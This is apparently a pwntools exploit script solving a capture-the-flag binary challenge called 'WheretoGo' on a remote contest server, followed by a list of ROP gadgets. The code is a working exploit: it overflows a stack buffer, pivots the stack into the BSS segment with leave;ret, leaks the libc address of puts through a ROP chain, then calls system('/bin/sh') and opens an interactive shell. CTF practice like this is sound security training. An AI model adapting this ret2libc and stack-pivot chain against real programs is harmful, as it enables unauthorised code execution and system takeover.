from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

io=remote("node2.anna.nssctf.cn",28972)
# io=process("./WheretoGo")
elf=ELF("./WheretoGo")
libc=ELF("./libc-2.31.so")

puts_plt=elf.plt[b"puts"]
puts_got=elf.got[b"puts"]
bk_addr=0x4011bd
bss_addr=0x404d00
read_text=0x4011C9
leave_ret=0x4011e0
pop_rdi=0x4012d3

io.recvuntil(b"go?\n")
payload=cyclic(0x80)+p64(bss_addr)+p64(read_text)
payload=payload.ljust(0x100,b"a")
io.send(payload)

payload=p64(0)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(bk_addr)
payload=payload.ljust(0x80,b"\x00")+p64(bss_addr-0x80)+p64(leave_ret)
payload=payload.ljust(0x100,b"a")
io.send(payload)

leak_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))-libc.sym[b"puts"]
print("leak_addr: "+hex(leak_addr))
sys_addr=leak_addr+libc.sym[b"system"]
str_bin_sh=leak_addr+next(libc.search(b"/bin/sh"))


payload=cyclic(0x80)+p64(bss_addr-0x200-0x8)+p64(read_text)
payload=payload.ljust(0x100,b"a")
io.send(payload)

# gdb.attach(io)
# pause()

payload=p64(0)+p64(pop_rdi)+p64(str_bin_sh)+p64(sys_addr)
payload=payload.ljust(0x80,b"\x00")+p64(bss_addr-0x280-0x8)+p64(leave_ret)
payload=payload.ljust(0x100,b"a")
io.send(payload)


# payload=cyclic(0x88)+p64(pop_rdi)+p64(str_bin_sh)+p64(sys_addr)
# io.send(payload)


io.interactive()

# Gadgets information
# ============================================================
# 0x00000000004011e0 : leave ; ret
# 0x00000000004012cc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004012ce : pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004012d0 : pop r14 ; pop r15 ; ret
# 0x00000000004012d2 : pop r15 ; ret
# 0x00000000004012cb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004012cf : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040115d : pop rbp ; ret
# 0x00000000004012d3 : pop rdi ; ret
# 0x00000000004012d1 : pop rsi ; pop r15 ; ret
# 0x00000000004012cd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret

# Unique gadgets found: 12
